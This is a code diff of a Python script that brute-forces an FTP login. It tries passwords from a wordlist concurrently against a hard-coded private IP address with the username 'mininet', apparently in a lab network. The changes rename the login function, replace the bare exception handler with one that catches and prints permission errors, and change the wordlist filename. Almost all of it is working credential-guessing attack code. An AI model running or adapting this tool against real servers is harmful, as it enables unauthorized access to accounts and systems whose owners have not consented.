@@ -16,24 +16,21 @@ import ftplib
 import concurrent.futures
 
 
-def attempt_ftp_login(server_ip, username, password):
-    """
-    Attempt to authenticate to the FTP server using provided credentials.
-    Returns True if login is successful, otherwise False.
-    """
+def ftp_login(host, username, password):
     try:
-        with ftplib.FTP(server_ip) as ftp:
+        with ftplib.FTP(host) as ftp:
             ftp.login(username, password)
-            print(f"[SUCCESS] Password found: '{password}' for user: '{username}'")
+            print(f"[SUCCESS] Password found: {password}")
             return True
-    except:
+    except ftplib.error_perm as e:
+        print(f"[FAILED] {e}")  # Affiche l'erreur exacte
         return False
 
 
 def main():
     server_ip = "10.12.0.40"
     username = "mininet"
-    wordlist_file = "most-common.txt"
+    wordlist_file = "common.txt"
 
     # Check if the wordlist exists
     if not os.path.exists(wordlist_file):
@@ -52,7 +49,7 @@ def main():
         for pwd in passwords:
             password = pwd.strip()
             print(f"[TRY] Attempting login with password: '{password}'")
-            future = executor.submit(attempt_ftp_login, server_ip, username, password)
+            future = executor.submit(ftp_login, server_ip, username, password)
             future_tasks.append(future)
 
         for future in concurrent.futures.as_completed(future_tasks):
